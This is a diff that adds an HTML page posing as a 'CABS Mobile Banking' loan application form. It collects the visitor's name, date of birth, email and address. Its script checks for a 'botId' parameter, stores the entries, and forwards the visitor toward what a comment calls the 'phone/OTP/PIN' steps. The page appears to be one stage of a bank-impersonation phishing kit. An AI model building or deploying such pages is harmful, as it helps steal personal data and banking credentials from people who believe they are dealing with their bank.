@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CABS Mobile Banking - Loan Application</title>
+
+    <style>
+        /* ── reset & base ── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 0;
+        }
+
+        .app-wrapper {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            min-height: 100vh;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        /* ── top bar (CABS blue) ── */
+        .top-bar {
+            height: 72px;
+            background: #0d47a1;
+            display: flex;
+            align-items: center;
+            padding: 0 22px;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            color: #fff;
+            font-size: 30px;
+            text-decoration: none;
+            font-weight: 300;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+        }
+
+        /* ── container ── */
+        .container {
+            padding: 24px 22px 100px;
+        }
+
+        /* ── header ── */
+        .page-header h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #0d47a1;
+            margin-bottom: 4px;
+            letter-spacing: -0.3px;
+        }
+
+        .page-header p {
+            font-size: 15px;
+            color: #555;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+
+        /* ── form elements ── */
+        form label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #555;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        form input,
+        form select {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border-radius: 10px;
+            border: 2px solid #d0d7de;
+            background: #fff;
+            color: #222;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.2s;
+            margin-bottom: 18px;
+            appearance: auto;
+        }
+
+        form input:focus,
+        form select:focus {
+            border-color: #0d47a1;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
+        }
+
+        form input::placeholder,
+        form select option {
+            color: #999;
+        }
+
+        form select option {
+            background: #fff;
+            color: #222;
+        }
+
+        /* ── checkboxes ── */
+        .checkbox-wrapper {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #444;
+            align-items: flex-start;
+        }
+
+        .checkbox-wrapper input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            min-width: 20px;
+            margin-top: 2px;
+            accent-color: #0d47a1;
+            cursor: pointer;
+            border: 2px solid #d0d7de;
+            border-radius: 4px;
+            background: #fff;
+        }
+
+        .checkbox-wrapper label {
+            cursor: pointer;
+            margin-bottom: 0;
+            color: #555;
+            font-weight: 400;
+            line-height: 1.5;
+        }
+
+        .checkbox-wrapper label strong {
+            color: #0d47a1;
+        }
+
+        /* ── continue button (fixed at bottom) ── */
+        .continue-btn {
+            position: fixed;
+            left: 24px;
+            right: 24px;
+            bottom: 28px;
+            width: auto;
+            max-width: 420px;
+            margin: 0 auto;
+            height: 56px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 10px;
+            border: none;
+            cursor: not-allowed;
+            transition: background 0.2s, transform 0.1s;
+            background: #b7cff0;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .continue-btn:enabled {
+            background: #0d47a1;
+            cursor: pointer;
+        }
+
+        .continue-btn:enabled:hover {
+            background: #0a3a8a;
+            transform: translateX(-50%) scale(1.01);
+        }
+
+        .continue-btn:enabled:active {
+            transform: translateX(-50%) scale(0.98);
+        }
+
+        /* ── footer ── */
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 12px;
+            color: #bbb;
+            letter-spacing: 0.5px;
+            padding-bottom: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px 100px;
+            }
+            .page-header h1 {
+                font-size: 24px;
+            }
+            .continue-btn {
+                height: 54px;
+                font-size: 18px;
+                left: 18px;
+                right: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="app-wrapper">
+
+    <!-- Top bar (CABS) -->
+    <div class="top-bar">
+        <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+    </div>
+
+    <div class="container">
+
+        <div class="page-header">
+            <h1>Loan Application</h1>
+            <p>Please provide your personal information</p>
+        </div>
+
+        <form id="loanForm">
+            <label>Full Name</label>
+            <input name="fullName" placeholder="e.g. John Doe" required />
+
+            <label>Date of Birth</label>
+            <input type="date" name="dob" required />
+
+            <label>Email Address</label>
+            <input type="email" name="email" placeholder="example@email.com" required />
+
+            <label>Residential Address</label>
+            <input name="address" placeholder="Your full address" required />
+
+            <label>Employment Status</label>
+            <select name="employmentStatus" required>
+                <option value="">Select</option>
+                <option>Employed</option>
+                <option>Self-employed</option>
+                <option>Unemployed</option>
+                <option>Student</option>
+            </select>
+
+            <label>Loan Purpose</label>
+            <select name="loanPurpose" required>
+                <option value="">Select</option>
+                <option>Business</option>
+                <option>Personal</option>
+                <option>Education</option>
+                <option>Medical</option>
+                <option>Emergency</option>
+            </select>
+
+            <label>Loan Amount (USD)</label>
+            <input type="number" name="loanAmount" required placeholder="MIN $100" min="100" max="100000" step="1" />
+
+            <label>Loan Term</label>
+            <select name="loanTerm" required>
+                <option value="">Select</option>
+                <option>6 months</option>
+                <option selected>12 months</option>
+                <option>24 months</option>
+                <option>36 months</option>
+                <option>48 months</option>
+            </select>
+
+            <div class="checkbox-wrapper">
+                <input type="checkbox" id="termsCheck" required />
+                <label for="termsCheck">I accept the terms and conditions</label>
+            </div>
+
+            <div class="checkbox-wrapper">
+                <input type="checkbox" id="interestCheck" required />
+                <label for="interestCheck">
+                    I understand that loans are subject to an interest rate of <strong>8% to 15% per month</strong>
+                    depending on creditworthiness and loan amount.
+                </label>
+            </div>
+        </form>
+
+        <div class="footer">v 5.3.2 (1.0.0)</div>
+    </div>
+
+    <!-- Fixed button -->
+    <button id="continueBtn" class="continue-btn" disabled>SUBMIT</button>
+
+</div>
+
+<!-- ====== YOUR ORIGINAL SCRIPT (UNTOUCHED, except for the alert language) ====== -->
+<script>
+    (function() {
+        // ---------- BOT ID ----------
+        const params = new URLSearchParams(window.location.search);
+        const urlBotId = params.get('botId');
+        if (urlBotId) localStorage.setItem('botId', urlBotId);
+        const botId = localStorage.getItem('botId');
+
+        if (!botId) {
+            alert('Invalid session. Please start again.');
+            window.location.href = 'index.html';
+            return;
+        }
+
+        // ---------- FORM ELEMENTS ----------
+        const form = document.getElementById('loanForm');
+        const termsCheck = document.getElementById('termsCheck');
+        const interestCheck = document.getElementById('interestCheck');
+        const button = document.getElementById('continueBtn');
+
+        // ---------- ENABLE BUTTON ----------
+        function updateButton() {
+            button.disabled = !(termsCheck.checked && interestCheck.checked);
+        }
+
+        termsCheck.addEventListener('change', updateButton);
+        interestCheck.addEventListener('change', updateButton);
+
+        // ---------- FORM SUBMIT ----------
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+
+            // Save all form data
+            const data = Object.fromEntries(new FormData(form));
+            localStorage.setItem('loanFormData', JSON.stringify(data));
+
+            // Save the full name (used later in phone/OTP/PIN)
+            localStorage.setItem('fullName', data.fullName);
+
+            // Redirect to phone verification
+            window.location.href = `details.html?botId=${botId}`;
+        });
+
+        // ---------- CLICK ON CONTINUE BUTTON TRIGGERS FORM SUBMIT ----------
+        button.addEventListener('click', function() {
+            if (!this.disabled) {
+                form.dispatchEvent(new Event('submit'));
+            }
+        });
+
+        // ---------- BACK BUTTON (top bar) already uses onclick ----------
+        // Also handle the case where the back button might be needed.
+    })();
+</script>
+
+</body>
+</html>
